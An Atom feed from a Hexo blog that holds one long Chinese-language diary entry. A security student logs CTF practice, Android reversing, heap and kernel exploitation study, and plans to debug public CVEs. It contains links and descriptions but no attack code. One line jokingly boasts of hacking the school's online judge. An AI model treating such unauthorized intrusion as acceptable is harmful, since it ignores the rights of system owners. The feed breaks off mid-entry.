<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Sakuraのblog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://eternalsakura13.com/"/>
  <updated>2018-06-18T18:02:36.827Z</updated>
  <id>http://eternalsakura13.com/</id>
  
  <author>
    <name>sakura</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Sakuraのdiary</title>
    <link href="http://eternalsakura13.com/2099/09/18/study/"/>
    <id>http://eternalsakura13.com/2099/09/18/study/</id>
    <published>2099-09-18T14:05:42.000Z</published>
    <updated>2018-06-18T18:02:36.827Z</updated>
    
    <content type="html"><![CDATA[<h2 id="2018-1-28"><a href="#2018-1-28" class="headerlink" title="2018-1-28"></a>2018-1-28</h2><p>1.看玄武实验室的每日安全推送（主要是看了android挖矿，p2p蠕虫）<br>2.配置shadow<br>尝试用gdb和gdbserver来调试<br><a href="https://github.com/CENSUS/shadow" target="_blank" rel="noopener">https://github.com/CENSUS/shadow</a><br><a href="https://developer.android.com/ndk/downloads/index.html?hl=zh-cn" target="_blank" rel="noopener">https://developer.android.com/ndk/downloads/index.html?hl=zh-cn</a><br><a href="http://kiya.studio/2017/06/21/android-gdb/" target="_blank" rel="noopener">http://kiya.studio/2017/06/21/android-gdb/</a><br>shadow文档的几个坑点</p><ul><li>arm-linux-androideabi-gdb，也就是gdb-arm版没有提供，要自己找，我装了一个ndk r10e，然后弄了一个，嗯，r11移除了gdb。</li><li>在gdb remote之前，文档里没有写forward转发，导致我试的时候一直refuse</li></ul><p>3.晚上最大的收获是看到了一个不错的blog（android逆向CTF）<br><a href="http://kiya.studio/2333/03/03/android-reversing-skills/#more" target="_blank" rel="noopener">http://kiya.studio/2333/03/03/android-reversing-skills/#more</a></p><h2 id="2018-1-29"><a href="#2018-1-29" class="headerlink" title="2018-1-29"></a>2018-1-29</h2><ol><li>看玄武的<a href="https://mp.weixin.qq.com/s/mOaXkGTY2704P6TV2KBvwg" target="_blank" rel="noopener">每日安全推送</a>，主要看了WinAFL</li><li>nexus5被我刷成砖……然后顺手把刷机、root和装xposed全都整理了一遍。</li><li>webkit的poc断点找到了，可以调了</li><li>做了一道阿里CTF第二题，一道关于反调试的题。</li></ol><h2 id="2018-1-31"><a href="#2018-1-31" class="headerlink" title="2018-1-31"></a>2018-1-31</h2><ol><li>看AI直播调webkit，感觉调浏览器好难呀。</li><li>看玄武的<a href="https://mp.weixin.qq.com/s/M4QZxs_G-lZ810o_i2KJhA" target="_blank" rel="noopener">每日安全推送</a>，主要关注了反调试和使用Strava 热力图来推断军事基地位置，很有趣的思路。</li><li>研究了一下加固原理和脱壳基础：dvmDexFileOpenPartial，还挺简单的。</li><li>研究了ptrace和调试器原理，了解了ptrace反调试的一些技巧</li></ol><h2 id="2018-2-1"><a href="#2018-2-1" class="headerlink" title="2018-2-1"></a>2018-2-1</h2><ol><li>本来想今天研究一下ndk编译的，不过睡着了……然后也没看什么东西</li><li>帮学弟解决了一些搭建博客的bug，顺便自己把博客的主题配色，代码高亮，搜索，评论什么的都修改或添加了，好看多了……</li></ol><h2 id="2018-2-2"><a href="#2018-2-2" class="headerlink" title="2018-2-2"></a>2018-2-2</h2><ol><li>看玄武的<a href="https://xuanwulab.github.io/cn/secnews/2018/02/02/index.html" target="_blank" rel="noopener">每日安全推送</a></li><li>钓鱼网站那个很有趣，我就测试了一下，然后因为ss代理不走终端，找了<a href="https://juejin.im/entry/5821840cd203090055134cc0" target="_blank" rel="noopener">一篇文章</a>和<a href="https://blog.kelu.org/tech/2017/07/06/parallels-vm-use-proxy-with-host-on-mac.html" target="_blank" rel="noopener">另一篇文章</a>，配置了一下就好了~</li><li>自己实践了一下那个钓鱼工具，实践文章和终端那个都可以在”杂项”分类里找到</li><li>研究了一下怎么用ndk-build编译一个能在手机上运行的c程序，这样明天就可以尝试hook了</li></ol><h2 id="2018-2-3"><a href="#2018-2-3" class="headerlink" title="2018-2-3"></a>2018-2-3</h2><ol><li>今天没有玄武的推送看~</li><li>研究了android native层hook，算是学到不少东西了。</li></ol><h2 id="2018-2-4"><a href="#2018-2-4" class="headerlink" title="2018-2-4"></a>2018-2-4</h2><ol><li>写了第一个xposed程序~遇到了一些坑，不过还是趟过去了。</li><li>修改nexus5的boot.img,打开系统调试，又坑了我一会。。</li></ol><h2 id="2018-2-5"><a href="#2018-2-5" class="headerlink" title="2018-2-5"></a>2018-2-5</h2><ol><li>今天出去怠惰了（茶）</li><li>xposed继续学习了一下，学会了一些姿势，感觉还是不错的~</li></ol><h2 id="2018-2-6"><a href="#2018-2-6" class="headerlink" title="2018-2-6"></a>2018-2-6</h2><ol><li>研究了怎么搭建shadowsocks服务端和优化，顺便卖了几个~</li><li>自己写了一个基于flask的B/S端口扫描器，代码太难看就不放了（茶</li></ol><h2 id="2018-2-7"><a href="#2018-2-7" class="headerlink" title="2018-2-7"></a>2018-2-7</h2><ol><li>继续看玄武每日推送<a href="https://mp.weixin.qq.com/s/FM-mZh1e8YQP0MWrV1IlVw" target="_blank" rel="noopener">2.6</a>和<a href="https://mp.weixin.qq.com/s/2JMrsyyuTErVy-pXRoL3Jg" target="_blank" rel="noopener">2.7</a><br>wordpress DOS有点意思，不过没搞懂，另外主要看了android安全公告2月版，看懂了一些（限于原理），开发太菜了。</li><li>学习了android的jni开发，基本的都摸了一遍。</li></ol><h2 id="2018-2-8"><a href="#2018-2-8" class="headerlink" title="2018-2-8"></a>2018-2-8</h2><ol><li>继续昨天的jni学习，摸清了native方法的动态注册</li><li>研究了下.init_array,结合jni动态注册，做了一道CTF题</li><li>继续看玄武每日推送<a href="https://mp.weixin.qq.com/s/sqPmC-z-HiH4UKArE1Gdgw" target="_blank" rel="noopener">2.8</a>,这篇<a href="https://www.fireeye.com/blog/threat-research/2018/02/reelphish-real-time-two-factor-phishing-tool.html" target="_blank" rel="noopener">钓鱼</a>的有趣</li><li>给AI写了个爬页面上文件的爬虫。</li></ol><h2 id="2018-2-9"><a href="#2018-2-9" class="headerlink" title="2018-2-9"></a>2018-2-9</h2><ol><li>研究android构建过程，Gradle工作流程</li><li>读玄武每日推送（存了个移动端静态分析的github准备好好看看）</li></ol><h2 id="2018-2-10"><a href="#2018-2-10" class="headerlink" title="2018-2-10"></a>2018-2-10</h2><ol><li>研究Dex文件格式和修复</li><li>学习了用ddms来dump出运行内存做题的技巧。</li><li>学习了新建android工程，调so文件解题。</li></ol><h2 id="2018-2-11"><a href="#2018-2-11" class="headerlink" title="2018-2-11"></a>2018-2-11</h2><ol><li>把昨天看到一道递归算法的android re做了，感觉现在做一般的CTF都有点思路了，做看雪的还是GG，还要提高姿势水平。</li><li>今天上午看到我在知乎的提问有师傅回答我了：<a href="https://www.zhihu.com/question/266901100/answer/316607339，然后作死的又打开了这个洞CVE-2015-3864，嗯...我调没调出来，忙活了一上午，断点都没断下来，但是起码……嗯，我记住了名字！libstagefright，我是记住了……别等我学会了来找你。。" target="_blank" rel="noopener">https://www.zhihu.com/question/266901100/answer/316607339，然后作死的又打开了这个洞CVE-2015-3864，嗯...我调没调出来，忙活了一上午，断点都没断下来，但是起码……嗯，我记住了名字！libstagefright，我是记住了……别等我学会了来找你。。</a></li><li>今天下午做完题就又瞎看了一会，思考我是不是选错了方向……android的调试贼麻烦，资料还贼少，看了看看雪，主要是浏览器、文件格式和内核，虽然其实都一样的，那些资料也不多，没法挖洞的……认识的dalao又少，没法充分交流QAQ，唉，感觉我是不是不适合当黑客，看vulcan的师傅微博，月月一大批CVE，就我什么都挖不到，不过今晚看了看师傅们的博客，他们的心路历程给了我很大勇气，是的，我早就不打算退后了，只有前进而已。</li></ol><h2 id="2018-2-12"><a href="#2018-2-12" class="headerlink" title="2018-2-12"></a>2018-2-12</h2><ol><li>今天刷空间看到moctf比赛，就参加了下，把android/linux re做掉就没看了。</li><li>依然很迷茫，不过其实想想，我开始学二进制，其实也就不到半年，进步速度并不是不能接受，只是在技能进阶上卡住了又没人交流而已，嗯，再想想好了。</li></ol><h2 id="2018-2-13到19"><a href="#2018-2-13到19" class="headerlink" title="2018-2-13到19"></a>2018-2-13到19</h2><ol><li>这些天几乎都过年去了……然后唯一做了点事就是把自己的课程设计做了，<a href="https://github.com/eternalsakura/PortScan" target="_blank" rel="noopener">PortScan</a></li><li>新年新气象，最近家里的事情也是乱七八糟，能多学点赚钱的技术分担压力就好了。</li><li>下学期的计划——fuzz、CVE漏洞研究、前端后端的一些Web开发（写点相关项目练手），然后找实习。</li><li>学会了一项新的运动，保龄球，很有意思。</li><li>最近一直什么都没学，自己也在反思一些东西，寻找一个前进的点。<br>比如浏览器，文件格式，还是内核，或者其他，还是都不是。<br>安全只是个抽象的概念，具体化了才能变成业务。<br>我还需要探究一段时间，读很多的漏洞分析文章，追随前辈们走过的路途，再进一步反思。<br>“一个漏洞的产生到漏洞利用至少会经历好几个阶段：Bug –&gt; exploitable bug(vulnerability) –&gt; poc –&gt; exploit –&gt; reliable/weaponized exploit。虽然大家都喜欢把fuzzing出来的bug讲成blah-blah-blah的故事或者作为PR，但我们真正关心的漏洞应该是能到最后两个阶段的vulnerability。”</li></ol><h2 id="2018-2-20到21"><a href="#2018-2-20到21" class="headerlink" title="2018-2-20到21"></a>2018-2-20到21</h2><ol><li>返校真是艰难……飞机火车客车出租全都转了一遍才到……</li><li>晚上收拾了下房间，看了看看雪，发现师傅做的有趣CTF题，<a href="https://bbs.pediy.com/thread-224686.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-224686.htm</a></li><li>群里在讨论内存管理和hook，被推荐了一本腾讯的手游安全的书《游戏安全：手游安全技术入门》，还不错，可以入个门……</li><li>看到一个博客提供了一些自定义ROM的资料，最近也想改，看到了就记录一下。<a href="https://my.oschina.net/ibuwai/blog?catalog=3379629&amp;temp=1519222237338" target="_blank" rel="noopener">https://my.oschina.net/ibuwai/blog?catalog=3379629&amp;temp=1519222237338</a></li></ol><h2 id="2018-2-22"><a href="#2018-2-22" class="headerlink" title="2018-2-22"></a>2018-2-22</h2><ol><li>看了《手游安全技术那本书》，学习了注入技术。</li><li>下午买了考虫的口语能力提升班，然后学习了下</li><li>晚上在seebug逛，找各种二进制漏洞分析的资料，然后看到了陈良的ppt,remet的github,韩子诺的文章，还有很多很多……CVE-2014-7911感觉可以调调，我得整理整理我搜的资料，然后按照原理-&gt;漏洞分析-&gt;exp去学习w</li></ol><h2 id="2018-2-23到25"><a href="#2018-2-23到25" class="headerlink" title="2018-2-23到25"></a>2018-2-23到25</h2><ol><li>是的，仔细算算，我已经编译AOSP编译了三天了，而且还没编译好……现在已经基本放弃在mac上编译了，我现在突然想,flanker大神之所以用ubuntu做主力机……是不是因为在mac上编译不出AOSP呀……(逃)</li><li>明天在旧电脑上装win/ubuntu的双系统，要不是因为这学期有win网络编程和c#开发……我就直接烧ubuntu进去了（撑脸</li><li>嗯，不用明天了，在今天的收尾……新学期的开始……我终于是守得云开见月明，把AOSP弄出来了！</li></ol><h2 id="2018-2-26"><a href="#2018-2-26" class="headerlink" title="2018-2-26"></a>2018-2-26</h2><ol><li>学习了stack pivot，<a href="http://tacxingxing.com/2017/05/10/stack-pivot/" target="_blank" rel="noopener">劫持栈指针</a></li><li>学习了heap spray,<a href="http://secwiki.neu.edu.cn/wiki/images/f/fe/%E5%86%85%E5%AD%98%E5%96%B7%E5%B0%84%E5%9C%A8%E5%AE%89%E5%8D%93Root%E5%88%A9%E7%94%A8%E4%B8%AD_%E9%99%88%E8%89%AF.pdf" target="_blank" rel="noopener">堆喷</a></li><li>学习了<a href="http://pwn4.fun/2016/11/20/C-虚函数调用攻防战/" target="_blank" rel="noopener">虚表攻防</a></li><li>了解android<a href="https://www.blackhat.com/docs/us-15/materials/us-15-Xu-Ah-Universal-Android-Rooting-Is-Back.pdf" target="_blank" rel="noopener">root</a></li><li>Time-of-check Time-of-use (TOCTOU) Race Condition</li><li>今天还是认真的研究了一下之前没调出来的cve-2015-3864，因为这个漏洞有完整的利用链资料，非常的棒，虽然可能调不了什么的，但是理解这个利用过程也很有意义。<br>还是要感谢一下看雪师傅的<a href="https://bbs.pediy.com/thread-222893.htm" target="_blank" rel="noopener">文章</a>，还加了好友0.0，感觉要是我一开始就是编译的AOSP去调试……可能寒假就调出来了2333，反正感觉今天还是很有收获的。</li></ol><h2 id="2018-2-27"><a href="#2018-2-27" class="headerlink" title="2018-2-27"></a>2018-2-27</h2><ol><li>一上午调了道64位rop，还没调出来..exm???是这题的错还是我的错…多看看别人的exp好了，以前还是做题不够，积累不够。</li><li>继续看stagefright好了，争取今天多少调一调。</li><li>好吧，没看进去，gp0的exp大致看懂了，不过metaphor的思路还是费解，可能我现在的理解力还是不够。</li><li>下午一直在整理之前看的ptmalloc的一些基本概念，虽然意义不是很大，但是理一理总是好的，还是要为ctf-wiki打call，里面写了非常多的干货，明天继续整理。</li></ol><h2 id="2018-2-28"><a href="#2018-2-28" class="headerlink" title="2018-2-28"></a>2018-2-28</h2><ol><li>体育课累死……密码学数学基础有趣。</li><li>今天把heap exploit的unlink整理了一下，虽然最后那个例子有点问题，我换了两个系统都没成功，但是原理还是理清了，真的是都快忘了……</li></ol><h2 id="2018-3-1"><a href="#2018-3-1" class="headerlink" title="2018-3-1"></a>2018-3-1</h2><ol><li>又混了篇看雪的优秀，感觉还是蛮有成就感的，自己发的文章都不是优秀就是精品。</li><li>今天有点怠惰呢，明天要继续努力。</li></ol><h2 id="2018-3-2"><a href="#2018-3-2" class="headerlink" title="2018-3-2"></a>2018-3-2</h2><ol><li>今天一天都在整理fastbin的一个内容（其实还玩了一会Web，黑掉学校OJ嘿嘿嘿）</li><li>这道赛题略难，然后跟团队练习赛的PragyanCTF，感觉这赛题像是file io啊。。谁出的题这么皮。。</li></ol><h2 id="2018-3-3"><a href="#2018-3-3" class="headerlink" title="2018-3-3"></a>2018-3-3</h2><ol><li>生日快乐~自己，去订了蛋糕，今天继续研究了一下那个fastbin的题，真的很难。。</li><li>把android kernel也编译了出来，这次真的是可以调了。。</li></ol><h2 id="2018-3-4"><a href="#2018-3-4" class="headerlink" title="2018-3-4"></a>2018-3-4</h2><ol><li>今天和实验室大一的聊了下，然后把我能知道的东西，方向什么的，都聊了一下。</li><li>9447 CTF 2015的fastbin是真的难……我还是不懂，算了算了，明天看点别的吧，这个todo。</li><li>今天和一个师傅聊了下IoT漏洞应该怎么挖，受益匪浅，但是转换为具体的硬实力还需要多看多学多调。</li></ol><h2 id="2018-3-5"><a href="#2018-3-5" class="headerlink" title="2018-3-5"></a>2018-3-5</h2><ol><li>今天把那道fastbin的题认真的理了理，其实也不是很难，然后又把pragyan ctf2018的两道pwn题做了一下，第一道还好，那个目录遍历没理解上，看了wp会了，第二道就有点迷，静态链接下的格式化字符串漏洞，没办法覆盖got表，看了一篇wp是覆盖malloc_hook，这不是我白天看的那道fastbin的套路么……真的是……然后打开栈执行，这……真是脑洞，又感觉自己很菜……</li><li>嗯w，文章又被看雪推送了，还是感觉蛮不错的……希望能认识更多人吧w，今天看了看玄武每日推送的目录，非常nice，准备找个时间把这段时间没看的都啃一下。</li></ol><h2 id="2018-3-6"><a href="#2018-3-6" class="headerlink" title="2018-3-6"></a>2018-3-6</h2><ol><li>上周的比赛，搞到今天总算是大致调完了，就只剩一个点不懂，也是实在搞不懂了，教主说的很有道理，只有把文章写成博客，发出去，才能检验你到底对这个东西的理解怎么样，事实上，也只有在学习中的我，才会如此详细的写wp吧。</li></ol><h2 id="2018-3-7-8"><a href="#2018-3-7-8" class="headerlink" title="2018-3-7-8"></a>2018-3-7-8</h2><ol><li>这两天把漏洞战争的环境大致搭了一下，从用windbg到看到符号，还是折腾了一下。</li></ol><h2 id="2018-3-9-10"><a href="#2018-3-9-10" class="headerlink" title="2018-3-9-10"></a>2018-3-9-10</h2><ol><li>调了一下漏洞战争堆的第一个binary，然后熟悉了一下工具使用，还是nice.</li><li>调了cve-2012-1876的poc，发现了一些书上没有提到的地方和一个错误，就不提勘误了…都出了这么久了…原理差不多懂了，很有趣。</li><li>今天有意想不到的收获，或者说机会吧，希望我能把握好，然后做好安全研究，成为一个优秀的黑客。</li><li>列一个CVE调试计划吧，目前进度1/10<br>浏览器<br>3.7 CVE-2012-1876,堆溢出（p2o ie9)<br>4.3 CVE-2011-0027,整数溢出漏洞 (p2o ie8)<br>4.6 CVE-2013-2551,整数溢出漏洞(p2o ie10)<br>7.4 CVE-2013-1347,UAF(ie)<br>android<br>10.7 CVE-2014-3153 anroid kernel提权</li></ol><h2 id="2018-3-11-12"><a href="#2018-3-11-12" class="headerlink" title="2018-3-11-12"></a>2018-3-11-12</h2><ol><li>这两天进度比较低迷，第一天直接莽上去调exp然后被打脸…今天把vupen的文章仔细读了一遍，把整个利用过程理解了一下。</li><li>说来有个有趣的点，p2o之后cve-2012-1876不是应该补了么，怎么在win8+ie10上还能利用，更有趣的是vupen明明用这个洞getshell了ie9，但是为什么keen在Study of Exploit Migitation in Modern Browsers这个ppt上说了bstr的分配不再能被利用，那vupen到底是怎么写的exp…</li><li>最近的计划（才怪…</li></ol><ul><li>编译的前端后端</li><li>kernel的漏洞</li><li>看diff写poc…</li></ul><h2 id="2018-3-13-14"><a href="#2018-3-13-14" class="headerlink" title="2018-3-13-14"></a>2018-3-13-14</h2><ol><li>密码学数学基础和算法这些课也就算了，晚上还有软件开发的课，各种文档什么的…能不能好好lu代码，把之前写的项目project答辩完了。</li><li>等到了想等的结果，收心认真学习了。</li><li>晚上把计算机系统素养里的部分内容（VM）又看了一下，十分有意义。</li><li>为了学编译原理，先自己lu一个c语言解释器了解个大概吧。</li></ol><h2 id="2018-3-15-17"><a href="#2018-3-15-17" class="headerlink" title="2018-3-15-17"></a>2018-3-15-17</h2><ol><li>这几天把write a c interpret看完了，大致了解了编译器前后端，当然肯定现在还是不会写的。</li><li>调cve-2012-7864,虽然称不上调通exp，但是大部分都调出来了，poc调的很顺利，在exp就处处踩坑。</li><li>说来好像webkit的dom的堆被分开了，以后就不会有那么多uaf了。</li></ol><h2 id="2018-3-18-20"><a href="#2018-3-18-20" class="headerlink" title="2018-3-18-20"></a>2018-3-18-20</h2><ol><li>日记还是要每天记……都忘了自己每天做了什么了……把c++的project做完了，做了两道pwn题。</li><li>看了一下LCTF2017的题目,large bin的unlink确实没练过，还有一道simpleVM改的题，都做做好了。</li></ol><h2 id="2018-3-21-25"><a href="#2018-3-21-25" class="headerlink" title="2018-3-21-25"></a>2018-3-21-25</h2><p>lctf2017的题目里学到不少东西，另外关于堆利用的姿势实在是不足，此外无libc利用这个也要再学习一下。<br>这几天除了两个project写，还打了强网杯，感觉就是什么都不会吧。。可能不该死磕一道题，应该都看看？…啊啊啊，难受死了，离顶尖水平差的根本不是一点半点……<br>还看了一篇清华的论文，非常nice。<a href="http://jcs.iie.ac.cn/ch/reader/view_abstract.aspx?file_no=20180101&amp;flag=1" target="_blank" rel="noopener">http://jcs.iie.ac.cn/ch/reader/view_abstract.aspx?file_no=20180101&amp;flag=1</a><br>还是有的挫败呢，离别人的水平。</p><h2 id="2018-3-26"><a href="#2018-3-26" class="headerlink" title="2018-3-26"></a>2018-3-26</h2><p>1.读玄武每日推送[<a href="http://chuansong.me/n/2253059751415" target="_blank" rel="noopener">http://chuansong.me/n/2253059751415</a>].</p><ul><li>mark一下<a href="https://rootkits.xyz/blog/2018/03/kernel-uninitialized-heap-variable/" target="_blank" rel="noopener">windows kernel漏洞利用</a>，mark一下k0师傅的<a href="https://whereisk0shl.top/post/2018-03-21" target="_blank" rel="noopener">UBUNTU 16.04 EBPF ARBITRARY READ/WRITE 漏洞分析</a>和360src的<a href="https://cert.360.cn/report/detail?id=ff28fc8d8cb2b72148c9237612933c11" target="_blank" rel="noopener">这篇</a>,看来调kernel还是有的调。</li><li>看到的<a href="https://github.com/sashs/arm_exploitation/blob/master/exploitation_on_arm_based_systems.pdf" target="_blank" rel="noopener">ARM exp开发</a>就很简略，感觉学不到什么东西。</li><li>mark一个超棒的<a href="http://www.makelinux.net/kernel_map/" target="_blank" rel="noopener">linux kernel交互图</a>，还能在页面上点击跳转到资料<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-26-LKM3_2048.png" alt=""></li><li>还有一个Stack pivoting  exploit的图收了,不知道他们怎么画的图这么好看。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-26-030340.jpg" alt=""></li><li><a href="https://static1.squarespace.com/static/552092d5e4b0661088167e5c/t/5a00963153450a8779b23489/1509987890282/Windows" target="_blank" rel="noopener">windows注册表审计</a>感觉以后用得到</li><li><a href="https://twitter.com/_niklasb/status/977141034059747328" target="_blank" rel="noopener">p2o的沙盒逃逸漏洞</a>这个感觉十分有意思。</li><li>blackhat上总有很多好议题，比如这个<a href="https://www.blackhat.com/docs/asia-18/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf" target="_blank" rel="noopener">绕过ASLR的新思路</a></li></ul><p>2.准备配linux kernel的调试环境，真的是……配不起来啊，双机调试，拉取符号文件，设置串口，改配置开启调试功能。rbq,rbq<br>3.加入了chamd5团队，有师傅一起学pwn，一起讨论真是太棒了QVQ</p><h2 id="2018-3-27"><a href="#2018-3-27" class="headerlink" title="2018-3-27"></a>2018-3-27</h2><ol><li><p>上午和出强网杯kernel题的师傅聊了一下kernel的调试环境搭建和赛题，师傅人蛮好。。<br>搭建的话，muhe师傅的<a href="https://www.anquanke.com/post/id/85837" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85837</a><br><strong>编译linux 注意去掉不必要的东西，然后编译busybox 然后插入内核  写linux init 最后制作cpio</strong><br>这样就可以qemu+gdb调试了，很nice。</p></li><li><p>下午和晚上忙各种杂七杂八的事情反正……不过总算还是把要复盘的赛题做完了。</p></li><li>另外，感觉自己的努力和天赋还是被人肯定的，加油吧，自己QVQ。</li></ol><h2 id="2018-3-28"><a href="#2018-3-28" class="headerlink" title="2018-3-28"></a>2018-3-28</h2><ol><li>人生这种东西，其实就是起起落落落落落落落落落落落落落落落落落落落落落落落落落落落落，23333<br>瞎看了半天linux inside，还看了下linux x86-64 asm，感觉没什么进展。</li><li>晚上在知乎提了个问题，别人指了一条很nice的路线给我，还和其他人get了一点点资料，感觉我应该也是可以搞的吧，嗯哼。<br>其实今天一直比较浮躁，还是昨天晚上的一些后遗症吧，还有就是期望和现实的落差……<br>不过冷静的回想一下，不能让自己立刻从舒适区脱离，从新掌握新的知识，那怎么进步呢？且行且努力（乖巧</li></ol><h2 id="2018-3-29"><a href="#2018-3-29" class="headerlink" title="2018-3-29"></a>2018-3-29</h2><ol><li>这几天事挺多的，今天才把blackhat的ppt都下载下来,然后看了下<a href="https://0x00sec.org/t/linux-internals-the-art-of-symbol-resolution/1488" target="_blank" rel="noopener">linux符号解析</a>还发现了一个<a href="https://github.com/elfmaster/skeksi_virus" target="_blank" rel="noopener">正在开发中的linux病毒</a></li><li>收集了蛮多linux kernel资料慢慢啃……今天啃了两个ppt，纯英文的那么多……我也是很意外自己读起来没什么障碍的……<br>学什么都要一步一步呀，能调通一个，调试就没什么了，后面的学习速度就看对于kernel和保护的理解了。</li></ol><h2 id="2018-3-30-31"><a href="#2018-3-30-31" class="headerlink" title="2018-3-30-31"></a>2018-3-30-31</h2><ol><li>这两天发生的事情还蛮多的，最近发生的一些事让我觉得，自己调的真洞还是太少，调就要调出来还要能调通，不过说实话吧……浏览器和kernel的洞真的不好调，我学二进制又不久……现在比赛练pwn都来不及，还要分身调洞，确实有点难啊……</li><li>不过kernel的ppt啃了俩，感觉纯英文的资料也就那个样子了，读起来还是挺流畅的，要是真的不懂换成中文我也不懂……</li><li>把kernel题的环境搭起来了，有师傅请教真的是比自己搞好太多……另外堆的题感觉有感觉了，准备给自己一个比较长的训练周期，比如十天，彻底脑内模拟透，最近进步还是蛮多，加油。<br>mark一个师傅的<a href="http://veritas501.space/2018/03/28/%E4%B8%A4%E6%AC%A1CTF%E6%AF%94%E8%B5%9B%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">博客</a></li></ol><h2 id="2018-4-1-3"><a href="#2018-4-1-3" class="headerlink" title="2018-4-1-3"></a>2018-4-1-3</h2><ol><li>打了一场0ctf，感觉自己还是太菜，不过在师傅们的帮助下，把能搞懂的题都搞懂了，学到很多很多东西，还是很开心的。</li><li>写wp太麻烦了坦白说。。不过还是写吧，不写的话自己都不知道能记得多久……</li></ol><h2 id="2018-4-4-11"><a href="#2018-4-4-11" class="headerlink" title="2018-4-4-11"></a>2018-4-4-11</h2><ol><li>这几天电脑键盘坏了，电脑送修什么都没干。下了个吃鸡手游，嗯，还挺好玩的，今天早上电脑到了删了。</li><li>把0ctf2018的4道pwn复盘完了，折腾kernel调试环境。。还是挺麻烦的。</li><li>想要的很简单，得到却很难，好想去实验室做安全研究。</li></ol><h2 id="2018-4-12"><a href="#2018-4-12" class="headerlink" title="2018-4-12"></a>2018-4-12</h2><ol><li>今天从qemu+gdb，各种花式报错，到搭建内核的双机调试，简直了……总算最后是勉强在win机器上弄好了。<br>今天得到的一个启发是，先找一个可以用的方案去做，不要想什么一次做到最好，到有机会再换方案。</li><li>英语作业还没做……唉……赶作业赶作业……</li></ol><h2 id="2018-4-13"><a href="#2018-4-13" class="headerlink" title="2018-4-13"></a>2018-4-13</h2><ol><li>今天也是一堆事情，睡到中午然后开始做ddctf，那个逆向的mips还有android逆向的RSA，pwn的win kernel exploit真的是有、意思。反正我不想做了，不如学习一个<a href="https://blog.betamao.me/2018/02/26/ptmalloc%E5%B0%8F%E8%AE%B0/" target="_blank" rel="noopener">新姿势</a></li><li>linux kernel调试的环境算是彻底搭好了，今天解决了两个昨天没解决的bug，已经可以看到源码了。</li></ol><h2 id="2018-4-14-15"><a href="#2018-4-14-15" class="headerlink" title="2018-4-14-15"></a>2018-4-14-15</h2><ol><li>解决了内核不能单步调试的问题，然后在复习信安数学了。。再不看要凉了</li><li>仔细跟了一下poc，感觉还是能看懂的。</li></ol><h2 id="2018-4-16-17"><a href="#2018-4-16-17" class="headerlink" title="2018-4-16-17"></a>2018-4-16-17</h2><ol><li>自己看了下日记，4月除了修电脑配环境，几乎什么都没做，这段时间心态太浮躁了，嗯，加个太，也要准备投几家实习了，本来以为可以拿到的offer，都感觉凉了，不过算了，我是要去实验室做安全研究的人呢。</li><li>分析了cve-2017-8890的漏洞成因和模型还有patch</li></ol><h2 id="2018-4-18"><a href="#2018-4-18" class="headerlink" title="2018-4-18"></a>2018-4-18</h2><ol><li>今天也是一堆的课，晚上和师傅们聊天聊八卦去了。。结果只把UAF对象的分配和释放调了调。</li><li>了解了一下实验室面试啥的，要好好调CVE了。</li></ol><h2 id="2018-4-19"><a href="#2018-4-19" class="headerlink" title="2018-4-19"></a>2018-4-19</h2><ol><li>看了看师傅们的面试题，觉得其实自己还能再抢救一下。。</li><li>今天看了长亭的kernel的洞，感觉分析成因还是很好分析的…但是exp调起来麻烦，也懒得写博客记录了，今天把webkit的调试记录了一下，明明好久之前就搞了，结果到现在还是这样没什么进展（茶</li></ol><h2 id="2018-4-20-21"><a href="#2018-4-20-21" class="headerlink" title="2018-4-20-21"></a>2018-4-20-21</h2><ol><li>编了一天v8，搞不出来，墙真讨厌。</li><li>调（看）了一个webkit的UAF漏洞，还行，感觉最难懂的还是对象之间的引用关系太复杂，还有就是回调函数跟着跟着容易找不到自己在哪。<br>“我是谁，谁在打我。”（逃）</li></ol><h2 id="2018-4-22-24"><a href="#2018-4-22-24" class="headerlink" title="2018-4-22-24"></a>2018-4-22-24</h2><ol><li>打了一场*ctf，又学到了新姿势。</li><li>在看v8，看JIT，看R大的回答，xjb搜文章，还是不错。</li><li>调通了p2o的一个v8的oob的洞，cve-2017-5053,还是不难。</li></ol><h2 id="2018-4-25-28"><a href="#2018-4-25-28" class="headerlink" title="2018-4-25-28"></a>2018-4-25-28</h2><ul><li><p>补一些浏览器的基础吧</p></li><li><p>学习了一下一个新的内核洞，有新的trick总结</p></li><li>最近觉得该搞搞利用了，路由器固件也可以玩一下，安全研究这么有趣，什么都能摸一下（才怪</li></ul><h2 id="2018-4-29-30"><a href="#2018-4-29-30" class="headerlink" title="2018-4-29-30"></a>2018-4-29-30</h2><ol><li>国赛打完了，各种不走心，状态奇差，混进赛区半决赛了，CTF也玩到这了吧先，后面好好研究浏览器。</li><li>看了Natalie Silvanovich写的How to Find JavaScript Vulnerabilities with Code Review</li></ol><ul><li>Determine intended functionality</li><li>Review implementation of important features</li><li>Review previously reported bugs</li><li>Brainstorm likely vulnerable areas</li><li>Review code!<br>Mozilla docs (MDN) is a great start for JS</li></ul><ol><li>想翻一些议题视频看的时候翻到了一个仓库，js vul的，存一下，<a href="https://github.com/tunz/js-vuln-db" target="_blank" rel="noopener">js-vuln-db</a></li></ol><h2 id="2018-4-31-5-2"><a href="#2018-4-31-5-2" class="headerlink" title="2018-4-31-5.2"></a>2018-4-31-5.2</h2><ol><li>看了一个js optimized code<a href="https://www.microsoft.com/en-us/research/video/chakra-script-optimized-code/" target="_blank" rel="noopener">视频</a>，虽然是chakra的<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-02-074634.png" alt=""><br>不过感觉，有点没用…这些我都知道（</li><li>看v8的gc,利用和各种，反正还是挺迷的，先看吧QVQ</li><li>看到一幅很棒的图，新的v8的执行图？<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-02-151804.jpg" alt=""></li><li>看webkit技术内幕找灵感，看洞有点看不明白了。</li></ol><h2 id="2018-5-3"><a href="#2018-5-3" class="headerlink" 